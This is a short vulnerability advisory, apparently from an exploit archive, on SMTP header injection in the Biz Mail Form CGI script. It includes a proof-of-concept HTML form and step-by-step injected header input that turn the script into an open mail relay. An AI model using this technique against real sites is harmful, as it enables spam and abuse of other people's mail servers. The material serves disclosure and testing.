@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/12620/info
+
+Biz Mail Form is prone to a vulnerability that allows the application to be abused as a mail relay.
+
+An attacker can exploit this issue to inject arbitrary SMTP headers by using CR and LF sequences.
+
+If successful, it becomes possible to abuse the application as a mail relay. Email may be sent to arbitrary computers. This could be exploited by spammers or other malicious parties.
+
+Update: It is reported that the update to address this issue (Biz Mail Form 2.2) is vulnerable to this issue as well. The affected version is being added as a vulnerable package and the fixes are being removed. 
+
+<HTML>
+<HEAD> <TITLE>Exploit Test Page</TITLE> </HEAD>
+<BODY>
+<form action="http://www.example.com/cgi-bin/bizmail/bizmail.cgi"
+method="POST" name="Subscribe">
+<TEXTAREA rows="5" name="email">&lt;/textarea&gt;
+<INPUT TYPE="submit" VALUE="Submit" class="submit">
+</FORM> </BODY> </HTML>
+
+In the textbox that pops up, enter in the following (begin by hitting
+enter to insert a blank line)
+
+From:email@example.com
+To:yourvalidemail@yourdomain.com
+Subject:Exploit Test
+
+This is a test
+
+Click submit. You'll receive an email from the bizmail script, but
+you won't receive the normal contact email. You can check the .dat
+file and see a copy of what you sent. 
